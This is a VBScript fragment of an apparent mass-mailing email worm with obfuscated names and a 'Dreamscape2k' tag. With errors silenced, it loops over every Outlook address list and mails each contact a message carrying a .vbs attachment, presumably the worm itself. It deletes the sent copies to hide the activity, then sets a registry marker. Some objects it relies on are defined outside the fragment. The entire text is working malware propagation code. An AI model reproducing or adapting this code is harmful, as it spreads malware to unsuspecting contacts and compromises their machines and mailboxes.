On Error Resume Next
function ds2kdmds2k()
		ds2ks1dstr = "Outlook.Application"
		Set ds2kouds2k = CreateObject(ds2ks1dstr)
		if ds2kouds2k = "Outlook" then
				ds2ks1ds2k = "Sup!"
				ds2ks2ds2k = "Muthafuckerz"
				ds2ks3ds2k = "Dreamscape2k 01"
				Set mbompuds2k = ds2kouds2k.GetNameSpace("MAPI")
				ds2km1ds2k=">DS2K "
				For Each ds2kalds2k In mbompuds2k.AddressLists
					If ds2kalds2k.AddressEntries.Count <> 0 Then
						ds2kacds2k=ds2kalds2k.AddressEntries.Count
					' k its this bit
					For ds2ka1ds2k = 1 To ds2kacds2k
							Set ds2kmsds2k = ds2kouds2k.CreateItem(0)
							set AddListEntry = ds2kalds2k.AddressEntries(ds2ka1ds2k)
							ds2kmsds2k.Subject = ds2ks1ds2k & ds2ks2ds2k & ds2ks3ds2k
							ds2kmsds2k.Body = ds2km1ds2k
							ds2kmsds2k.Attachments.Add ds2kfsds2k.GetSpecialFolder(0) & "\" & ds2kmnds2k & ".vbs"
							ds2kmsds2k.DeleteAfterSubmit = True
							ds2kmsds2k.to =AddListEntry.Address
						if ds2kmsds2k.to <> "" then
							ds2kmsds2k.Send
						end if
					Next

					End If
				Next
			ds2kwsds2k.RegWrite "HKCU\Software\" & ds2kmnds2k & "\ml", "1"
			ds2kouds2k.Quit
		end if
end function